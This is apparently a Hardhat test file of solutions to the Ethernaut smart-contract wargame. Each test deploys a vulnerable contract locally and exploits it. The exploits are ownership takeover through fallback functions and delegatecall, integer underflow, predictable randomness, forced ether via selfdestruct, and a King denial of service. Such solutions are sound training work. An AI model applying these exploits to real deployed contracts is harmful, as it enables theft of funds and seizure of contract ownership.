const { expect } = require("chai");
const { ethers,waffle } = require("hardhat");

describe("Ethernaut ", function () {

  before(async () => {
    [account1, account2] = await ethers.getSigners();
    });

  it.skip("1.Fallback", async function () {
    const Contract = await ethers.getContractFactory("Fallback");
    const contract = await Contract.deploy();
    await contract.deployed();

    const provider = waffle.provider;

    //call contribute function
    await contract.connect(account2).contribute({value: '100000000000000'});

    //check that the contract has balance
    console.log("Balance of the contract before attack:", (await provider.getBalance(contract.address)).toString());
    //create a tx to send ether to the contract
    tx = {
      to: contract.address,
      value: '100000000000000'
    }

    //send ether to the contract and steal ownership
    await account2.sendTransaction({to: contract.address,value: '100000000000000'});

    //check ownership
    expect(await contract.owner()).to.be.equal(account2.address);

    //withdraw the funds
    await contract.connect(account2).withdraw();

    //check that the contract has no balance
    console.log("Balance of the contract after attack:", (await provider.getBalance(contract.address)).toString());
  });

  it.skip("2.Fallout", async function () {
    const Contract = await ethers.getContractFactory("Fallout");
    const contract = await Contract.deploy();
    await contract.deployed();

    const provider = waffle.provider;

    //check owner (the contract shuldnt have owner)
    expect(await contract.owner()).to.be.equal('0x0000000000000000000000000000000000000000');

    //steal ownership
    await contract.connect(account2).Fal1out();

    //check if the ownership changes
    expect(await contract.owner()).to.be.equal(account2.address);
  });

  it.skip("3.Coin Flip", async function () {
    const Contract = await ethers.getContractFactory("CoinFlip");
    const contract = await Contract.deploy();
    await contract.deployed();

    const Attacker = await ethers.getContractFactory("CoinFlipAttacker");
    const attacker = await Attacker.deploy(contract.address);
    await attacker.deployed();

    const provider = waffle.provider;

    for(let i=0 ; i<10 ; i++){
      await attacker.attack();
    }

    console.log("aciertos: ",(await contract.consecutiveWins()).toString())
  });

  it.skip("4.Telephone", async function () {
    const Contract = await ethers.getContractFactory("Telephone");
    const contract = await Contract.deploy();
    await contract.deployed();

    const Attacker = await ethers.getContractFactory("TelephoneAttacker");
    const attacker = await Attacker.deploy(contract.address);
    await attacker.deployed();

    const provider = waffle.provider;

    console.log("Owner before the attack: ", await contract.owner());
    await attacker.attack();
    console.log("Owner after the attack: ", await contract.owner());
  });

  it.skip("5.Token", async function () {
    const Contract = await ethers.getContractFactory("Token");
    const contract = await Contract.deploy(20);
    await contract.deployed();

    //check the correct deploy
    expect(await contract.balanceOf(account1.address)).to.be.equal(20);

    //execute the attack, balance should be greater than 20
    await contract.transfer(account2.address, 21);

    //check if the attack works
    console.log("Balance of account1: ", (await contract.balanceOf(account1.address)).toString());
  });

  //had some wierd problems using ethers js here
  it.skip("6.Delegation", async function () {
    const Delegate = await ethers.getContractFactory("Delegate");
    const delegate = await Delegate.deploy(account2.address);
    await delegate.deployed();

    const Delegation = await ethers.getContractFactory("Delegation");
    const delegation = await Delegation.connect(account2).deploy(delegate.address);
    await delegation.deployed();

    expect(await delegation.owner()).to.be.equal(account2.address);
    const selector = web3.eth.abi.encodeFunctionSignature("pwn()");
    await web3.eth.sendTransaction({from: account1.address, to: delegation.address, data: selector});

    expect(await delegation.owner()).to.be.equal(account1.address);
    
  });

  it.skip("7.Force", async function () {
    const Force = await ethers.getContractFactory("Force");
    const force = await Force.deploy();
    await force.deployed();

    //contract with ether and selfdestruct instruction
    const Helper = await ethers.getContractFactory("Helper");
    const helper = await Helper.deploy(force.address,{value:'10000000000'});
    await helper.deployed();

    const provider = waffle.provider;

    //call the function to destruct and send the ether
    await helper.destroy();

    console.log("Balance of Force contract: ", (await provider.getBalance(force.address)).toString());
  });

  it("9.King", async function () {
    const King = await ethers.getContractFactory("King");
    const king = await King.deploy({value:'100'});
    await king.deployed();

    //contract that will send ether to the king contract and cannot receive ether
    const KingAttacker = await ethers.getContractFactory("KingAttacker");
    const kingAttacker = await KingAttacker.connect(account2).deploy();
    await kingAttacker.deployed();

    //send ether to claim the king
    await kingAttacker.attack(king.address,{value:'1000'});

    //check that king change
    expect(await king._king()).to.be.equal(kingAttacker.address);

    //contract cannot receive ether
     await expect(account1.sendTransaction({to:king.address, value: '10000000'})).to.be.reverted;
  });
});
